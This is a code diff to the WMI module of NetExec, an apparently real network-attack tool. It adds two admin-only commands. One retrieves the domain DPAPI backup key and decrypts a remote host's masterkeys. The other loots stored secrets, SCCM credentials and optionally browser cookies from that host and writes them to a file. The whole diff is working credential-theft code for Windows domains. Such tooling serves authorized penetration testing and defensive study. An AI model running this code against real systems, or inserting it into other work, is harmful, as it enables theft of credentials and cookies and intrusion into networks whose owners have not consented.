@@ -5,7 +5,11 @@ from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.config import process_secret
 from nxc.connection import connection, dcom_FirewallChecker, requires_admin
 from nxc.logger import NXCAdapter
+from nxc.helpers.logger import highlight
 from nxc.protocols.wmi import wmiexec, wmiexec_event
+from nxc.helpers.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection, DPAPITriage
+
+from dploot.lib.network.wmi import WMITarget as Target
 
 from impacket import ntlm
 from impacket.uuid import uuidtup_to_bin
@@ -47,6 +51,8 @@ class wmi(connection):
         }
         self.iWbemLevel1Login = None
         self.dcom_conn = None
+        self.pvkbytes = None
+        self.no_da = None
 
         connection.__init__(self, args, db, host)
 
@@ -484,3 +490,83 @@ class wmi(connection):
             return output
         else:
             return output
+
+    @requires_admin
+    def sccm(self):
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            address=self.hostname + "." + self.domain if self.kerberos else self.host,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+            do_kerberos=self.kerberos,
+            aesKey=self.aesKey,
+            no_pass=True,
+            use_kcache=self.use_kcache,
+        )
+
+        conn = upgrade_to_dploot_connection(context=self, target=target, protocol="wmi")
+        if conn is None:
+            self.logger.debug("Could not upgrade connection")
+            return
+
+        masterkeys = collect_masterkeys_from_target(self, target, conn, user=False)
+
+        if len(masterkeys) == 0:
+            self.logger.fail("No masterkeys looted")
+            return
+
+        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")
+
+        dpapi_triage = DPAPITriage(self, target, conn)
+        dpapi_triage.triage_sccm(masterkeys)
+
+    @requires_admin
+    def dpapi(self):
+        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # noqa: SIM115
+
+        if self.args.pvk is not None:
+            try:
+                self.pvkbytes = open(self.args.pvk, "rb").read()  # noqa: SIM115
+                self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
+            except Exception as e:
+                self.logger.fail(str(e))
+
+        if self.pvkbytes is None:
+            self.pvkbytes = get_domain_backup_key(self)
+
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            address=self.remoteName,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+            do_kerberos=self.kerberos,
+            aesKey=self.aesKey,
+            no_pass=True,
+            use_kcache=self.use_kcache,
+        )
+
+        conn = upgrade_to_dploot_connection(context=self, target=target, protocol="wmi")
+        if conn is None:
+            self.logger.debug("Could not upgrade connection")
+            return
+
+        masterkeys = collect_masterkeys_from_target(self, target, conn)
+
+        if len(masterkeys) == 0:
+            self.logger.fail("No masterkeys looted")
+            return
+
+        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
+
+        dpapi_triage = DPAPITriage(self, target, conn, dump_cookies="cookies" in self.args.dpapi)
+        dpapi_triage.triage(masterkeys)
+
+        if self.output_file:
+            self.output_file.close()
+            with open(self.output_file_template.format(output_folder="dpapi")) as f:
+                if sum(1 for _ in f) == 0:
+                    self.logger.fail("No dpapi loot retrieved")
